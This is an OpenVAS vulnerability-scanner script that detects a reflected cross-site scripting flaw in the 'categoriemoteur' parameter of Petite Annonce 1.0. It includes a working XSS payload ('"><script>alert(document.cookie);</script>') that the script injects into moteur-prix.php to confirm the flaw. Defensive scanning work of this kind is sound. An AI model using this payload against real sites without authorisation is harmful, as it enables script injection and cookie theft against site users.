###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_petite_annonce_xss_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Petite Annonce 'categoriemoteur' Cross Site Scripting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML or
  web script in a user's browser session in context of an affected site.
  Impact Level: Application";

tag_summary = "This host is installed with Petite Annonce and is prone to cross
  site scripting vulnerability.";
tag_solution = "No solution or patch is available as of 18th March, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://metropolis.fr.cr";
tag_insight = "Input passed via the 'categoriemoteur' GET parameter to 'moteur-prix.php'
  is not properly sanitized before being used.";
tag_affected = "Petite Annonce version 1.0";

if(description)
{
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_id(803184);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-03-18 13:55:51 +0530 (Mon, 18 Mar 2013)");
  script_name("Petite Annonce 'categoriemoteur' Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  script_xref(name : "URL" , value : "http://osvdb.org/91440");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/120816/");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2013/Mar/143");

  script_description(desc);
  script_summary("Check if Petite Annonce is vulnerable to XSS vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
sndReq = "";
rcvRes = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Iterate over the possible directories
foreach dir (make_list("", "/annonce", cgi_dirs()))
{
  ## Request for the index.php
  sndReq = http_get(item:string(dir, "/index.html"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

  ## confirm the Application
  if("petite annonce" >< rcvRes && ">DEPOSER UNE ANNONCE<" >< rcvRes)
  {
    ## Construct Attack Request
    url = dir + '/annonce/moteur-prix.php?categoriemoteur=1"><script>alert' +
          '(document.cookie);</script>';

    ## Try attack and check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, check_header:TRUE,
            pattern:"><script>alert\(document.cookie\);</script>",
            extra_check:make_list("regionmoteur.value","categoriemoteur.value")))
    {
      security_warning(port);
      exit(0);
    }
  }
}
